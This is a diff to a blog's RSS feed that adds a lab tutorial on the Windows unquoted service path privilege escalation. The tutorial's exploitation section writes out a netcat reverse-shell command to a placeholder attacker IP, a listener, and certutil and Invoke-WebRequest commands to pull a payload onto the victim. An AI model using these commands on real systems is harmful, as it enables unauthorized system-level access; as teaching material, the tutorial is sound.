@@ -1,13 +1,1858 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>Norlin</title>
+    <title>:~$ bash_</title>
     <description>Burak Baris</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Mon, 27 Dec 2021 16:47:35 +0000</pubDate>
-    <lastBuildDate>Mon, 27 Dec 2021 16:47:35 +0000</lastBuildDate>
+    <pubDate>Mon, 27 Dec 2021 19:48:04 +0000</pubDate>
+    <lastBuildDate>Mon, 27 Dec 2021 19:48:04 +0000</lastBuildDate>
     <generator>Jekyll v4.2.1</generator>
+    
+      <item>
+        <title>Unquoted Service Path Vulnerability</title>
+        <description>&lt;h1 id=&quot;what-is-unquoted-service-path-&quot;&gt;What is Unquoted Service Path ?&lt;/h1&gt;
+
+&lt;p&gt;&lt;strong&gt;Unquoted Service Path&lt;/strong&gt; is a vulnerability that occurs when a service is created with a &lt;strong&gt;service path&lt;/strong&gt; without appropriate
+quoting surrounding the path string, and if the path contains spaces, that can end up with a &lt;strong&gt;privilege escalation&lt;/strong&gt; with the
+permissions of whoever created the service.&lt;/p&gt;
+
+&lt;h1 id=&quot;how-it-works-&quot;&gt;How it works ?&lt;/h1&gt;
+
+&lt;p&gt;Typically &lt;a href=&quot;https://en.wikipedia.org/wiki/Service_Control_Manager&quot;&gt;&lt;strong&gt;Service Control Manager&lt;/strong&gt;&lt;/a&gt; will run the service’s executable
+by looking at its full path.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Path of the safe service -&amp;gt; “C:\Program Files\a folder\b folder\c folder\vulnservice.exe”&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The service control manager will execute vulnservice.exe due to the fact that the path has appropriate quoting. 
+&lt;br /&gt;Basically, the system will interpret the path as a full string. 
+&lt;br /&gt;
+&lt;br /&gt;
+However, if the full path of the service file is not enclosed within quotation marks just like the following example:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Path of the vulnerable service -&amp;gt; C:\Program Files\a folder\b folder\c folder\vulnservice.exe&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;This time, for each space in the path, the system will append the &lt;strong&gt;.exe&lt;/strong&gt; extension at the end of the most recent 
+space. Thus the first string chunk of the folder name will be treated as an executable.
+&lt;br /&gt;Interpretation would be as following:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;C:\&lt;strong&gt;Program.exe&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;C:\Program Files\&lt;strong&gt;a.exe&lt;/strong&gt; : If Progam.exe does not exist, execute a.exe&lt;/li&gt;
+  &lt;li&gt;C:\Program Files\a folder\&lt;strong&gt;b.exe&lt;/strong&gt; : If a.exe does not exist, execute b.exe&lt;/li&gt;
+  &lt;li&gt;C:\Program Files\a folder\b folder\&lt;strong&gt;c.exe&lt;/strong&gt; : If b.exe does not exist, execute c.exe&lt;/li&gt;
+  &lt;li&gt;C:\Program Files\a folder\b folder\c folder\&lt;strong&gt;vulnservice.exe&lt;/strong&gt; : If c.exe does not exist, execute vulnservice.exe&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h1 id=&quot;how-to-exploit-it-&quot;&gt;How to exploit it ?&lt;/h1&gt;
+
+&lt;p&gt;Consider that you have gained a shell from a low privileged user in the system. However that user has the write permission
+for one of these subfolders. Then you can deploy a malicious executable inside that subfolder by naming it with the the 
+first string chunk of its child folder.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;Lets assume that the user that you have gained access to has the write permission for the b folder. If you create a malware 
+named a.exe and drop it inside the b folder, the system will run your executable at the next run of the service.&lt;/p&gt;
+
+&lt;h1 id=&quot;setting-the-lab&quot;&gt;Setting the Lab&lt;/h1&gt;
+
+&lt;p&gt;In order to exploit the vulnerability, we need to create one.
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Open up the start menu, and launch a command prompt by running it as an administrator.
+&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/1.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Create a low privileged user:
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;net user krygen krygen /add&lt;/code&gt;
+&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/2.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
+Press &lt;strong&gt;Win+R&lt;/strong&gt;, and run &lt;strong&gt;lusrmgr.src&lt;/strong&gt;, to see all users and groups in the system.
+&lt;br /&gt;You can see the user krygen has been created successfully.
+&lt;br /&gt;It is also possbile to run ‘&lt;strong&gt;net user krygen&lt;/strong&gt;’ to get same information from the command line.
+&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/3.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
+And the account belongs to the &lt;strong&gt;Users Group&lt;/strong&gt;.
+&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/4.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
+To create a vulnerable service run this command:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;sc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;create&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Vuln Service&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;binpath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Proogram Files\a folder\b folder\c folder\vulnservice.exe&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Displayname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Vulnerable Service&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;auto&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;sc.exe is the utility to create and interact with the services.&lt;/li&gt;
+  &lt;li&gt;binpath is the path of the binary executable of the service.&lt;/li&gt;
+  &lt;li&gt;Displayname is not mandatory, if you leave it blank, it will take the name of the service.&lt;/li&gt;
+  &lt;li&gt;start is the start type, it can be either auto or manual.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/5.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
+&lt;br /&gt; We can see the details of any service by runnig ‘&lt;strong&gt;sc qc {SERVICE NAME}&lt;/strong&gt;’.
+&lt;br /&gt;Important fields to notice:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;START_TYPE = AUTO_START -&amp;gt; Service will start automatically when the sytem boots.&lt;/li&gt;
+  &lt;li&gt;SERVICE_START_NAME = LocalSystem -&amp;gt; Service will start with the LocalSystem service account privileges.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account?redirectedfrom=MSDN&quot;&gt;&lt;strong&gt;LocalSystem&lt;/strong&gt;&lt;/a&gt; is a 
+service account, and it has the highest privileges of the system, which is the system root.
+&lt;br /&gt; Read more about &lt;a href=&quot;https://stackoverflow.com/questions/510170/the-difference-between-the-local-system-account-and-the-network-service-acco&quot;&gt;&lt;strong&gt;Microsoft Service Accounts&lt;/strong&gt;&lt;/a&gt;.
+&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/6.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
+Let create directories which is declared as a path for our service.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;mkdir&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Program Files\a folder\b folder\c folder&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/7.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
+As you can see, it is not possible to start the service since the there is no executable in path.
+&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/8.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;I will create two executables, both will delete different txt files from a specified path.
+&lt;br /&gt;One will delete &lt;strong&gt;burak.txt&lt;/strong&gt; and the other, &lt;strong&gt;krygen.txt&lt;/strong&gt;, for every 3 seconds.
+&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/9.jpg&quot; alt=&quot;&quot; /&gt;&lt;em&gt;Source code for vulnservice.exe&lt;/em&gt;&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/10.jpg&quot; alt=&quot;&quot; /&gt;&lt;em&gt;Source code for b.exe&lt;/em&gt;&lt;br /&gt;&lt;br /&gt;
+I have compiled both C codes with GCC and converted them into executables.
+&lt;br /&gt;&lt;a href=&quot;https://sourceforge.net/projects/gcc-win64/&quot;&gt;&lt;strong&gt;Download gcc compiler&lt;/strong&gt;&lt;/a&gt;
+&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/11.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Put the &lt;strong&gt;vulnservice.exe&lt;/strong&gt; into the &lt;strong&gt;c folder&lt;/strong&gt;. When I start the service manually, starting from &lt;strong&gt;C:\&lt;/strong&gt;, the system will 
+try to execute Program.exe then a.exe, then b.exe, then c.exe.However, none of them will be found. Thus vulnservice.exe will 
+be executed as expected behaviour.
+&lt;br /&gt;&lt;br /&gt;
+Let run the service:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;sc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Vuln Service&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/12.jpg&quot; alt=&quot;&quot; /&gt;&lt;em&gt;First run: 0th second&lt;/em&gt;&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/13.jpg&quot; alt=&quot;&quot; /&gt;&lt;em&gt;3rd second&lt;/em&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now put b.exe in a folder, then start the service again.
+&lt;br /&gt;Remember the execution the we have discussed at the beginning.
+&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/14.jpg&quot; alt=&quot;&quot; /&gt;&lt;em&gt;First run: 0th second&lt;/em&gt;&lt;br /&gt;&lt;br /&gt;
+As you can see, this time krygen.txt had been deleted instead of burak.txt, which is catastrophic for the system,
+but it was what we were expecting.
+&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/15.jpg&quot; alt=&quot;&quot; /&gt;&lt;em&gt;3rd second&lt;/em&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h1&gt;
+
+&lt;p&gt;We have set the environment up. However, until now, we had access to admin privileges. Thus we were able to start the service 
+manually and write any of the subdirectories of the service path.
+&lt;br /&gt;As the name suggests &lt;strong&gt;privilege escalation&lt;/strong&gt;, is about raising our permissions to the LocalSystem/root permissions from
+a lower privileged user. There is no point to exploit a vulnerability after you have complete control over the system.
+&lt;br /&gt;&lt;br /&gt;
+Let’s check the the &lt;a href=&quot;https://networkencyclopedia.com/access-control-list-acl/&quot;&gt;&lt;strong&gt;ACL(Access Control List)&lt;/strong&gt;&lt;/a&gt; of the ‘C:\Program Files\a folder’ with &lt;a href=&quot;https://www.techtarget.com/searchwindowsserver/definition/icacls&quot;&gt;&lt;strong&gt;icacls&lt;/strong&gt;&lt;/a&gt;. 
+&lt;br /&gt;&lt;br /&gt;Run:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;icacls&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Program Files\a folder&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;br /&gt;The Users Group entry, &lt;strong&gt;BUILTIN\Users:(I)(RX)&lt;/strong&gt;, gives access &lt;strong&gt;read&lt;/strong&gt; and &lt;strong&gt;execute&lt;/strong&gt; permissions 
+for every user who belongs to &lt;strong&gt;Users Group&lt;/strong&gt;. The &lt;strong&gt;krygen&lt;/strong&gt; user we have created at the beginning of the 
+post belongs to the Users Group. However, for the vulnerability to occur ,Users Group needs the &lt;strong&gt;write&lt;/strong&gt; 
+permission for any of those subfolders, a,b or c, it does not matter which. For this example I will use &lt;strong&gt;a folder&lt;/strong&gt;.
+&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/16.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Let us grant write access to Users Group for &lt;strong&gt;a folder&lt;/strong&gt;.
+&lt;br /&gt;&lt;br /&gt;Run:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;icacls&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Program Files\a folder&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/grant&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;BUILTIN\Users&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;W&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Then run:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;icacls&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Program Files\a folder&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;This time you will see a new entry &lt;strong&gt;BUILTIN\Users:(W)&lt;/strong&gt;
+&lt;br /&gt;&lt;br /&gt;Now the user we have created, krygen, can write to that specific directory.
+&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/17.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Log in to the system with the account that you have created which belongs to the Users Group, for me it is krygen user.
+&lt;br /&gt;We will assume that, somehow you have gained accessed to the system as the user krygen.
+&lt;br /&gt;I will use &lt;a href=&quot;https://github.com/andrew-d/static-binaries/blob/0be803093b7d4b627b4d4eddd732e54ac4184b67/binaries/windows/x86/ncat.exe&quot;&gt;&lt;strong&gt;netcat&lt;/strong&gt;&lt;/a&gt;
+in order to establish a connection and take a shell from krygen to my attacker machine.
+&lt;br /&gt;&lt;br /&gt;Run this on the attacker machine:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;nc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-nvlp&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOME&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;FREE&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Run that on the windows machine:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;nc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cmd.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;OF&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;THE&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ATTACKER&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;MACHINE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PORT&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;THE&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ATTACKER&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;MACHINE&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;LISTENS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;TO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/18.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
+Now that we have access to the krygen’s shell, we can try to write to all those a,b and c folders by attempting to create a 
+new folder in each of them to test which one of them is accessible. We already know it is &lt;strong&gt;a folder&lt;/strong&gt;, no harm double-checking.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/19.jpg&quot; alt=&quot;&quot; /&gt;&lt;em&gt;Folder creation is successfull inside ‘a folder’&lt;/em&gt;&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/20.jpg&quot; alt=&quot;&quot; /&gt;&lt;em&gt;Failed to create folder inside ‘b folder’&lt;/em&gt;&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/21.jpg&quot; alt=&quot;&quot; /&gt;&lt;em&gt;Failed to create folder inside ‘c folder’&lt;/em&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Since the directory that we can write is the &lt;strong&gt;a folder&lt;/strong&gt;, if we want the service to execute our binary executable
+instead of the service file, the name of the malicious executable should be the first chunk of the child directory, which is
+&lt;strong&gt;b&lt;/strong&gt;.exe.
+&lt;br /&gt;
+I am going to use &lt;a href=&quot;https://www.offensive-security.com/metasploit-unleashed/Msfvenom/&quot;&gt;&lt;strong&gt;msfvenom&lt;/strong&gt;&lt;/a&gt; to create a reverse shell
+binary back to my machine.&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Parameter&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Functionality&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;LHOST&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;The IP address that the reverse shell will connect&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;LPORT&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;The port that the reverse shell will connect&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-p&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Payload to use&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-o&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Name of the file&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-f&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;File type of the output binary&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/22.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now we need to download the executable to the victim machine.
+&lt;br /&gt;Run this in the directory that your executable locates. It will start a web server inside of that directory.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;python &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/23.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
+&lt;br /&gt;You can download any file from the running python server by using one of these utilites.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;powershell&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Invoke-WebRequest -URI {YOUR SERVER IP(THM IP)}:80/{THE FILE YOU WANT TO DOWNLOAD} -OutFile {THE PATH WHERE THE FILE WILL BE SAVED}&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;certutil.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-urlcache&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-split&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;http://&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;YOUR&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;SERVER&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;THM&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)}:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;THE&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;FILE&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;YOU&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WANT&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;TO&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DOWNLOAD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Double-check to see if the executable downloaded successfully into the directory to which you have the write access.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/24.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
+Start a &lt;strong&gt;netcat&lt;/strong&gt; listener on the port you declared in the reverse shell binary.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/25.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Since we do not have &lt;strong&gt;LocalSystem&lt;/strong&gt; permissions, it is impossible to start the service manually. However, the start type of the 
+service is &lt;strong&gt;AUTO_START&lt;/strong&gt;. Thus the service will be initialized at the system boot. All we have to do is reboot the system
+and wait for the connection to establish.
+&lt;br /&gt;Run:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;sutdown&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/r&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/t&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;0&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/27.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Hurray ! The connection has been established successfully, even though no login had not yet been attempted on the windows machine.
+The path we are in is &lt;strong&gt;system32&lt;/strong&gt;, which means we have the console with administrator rights, 
+have fun after that point :))).
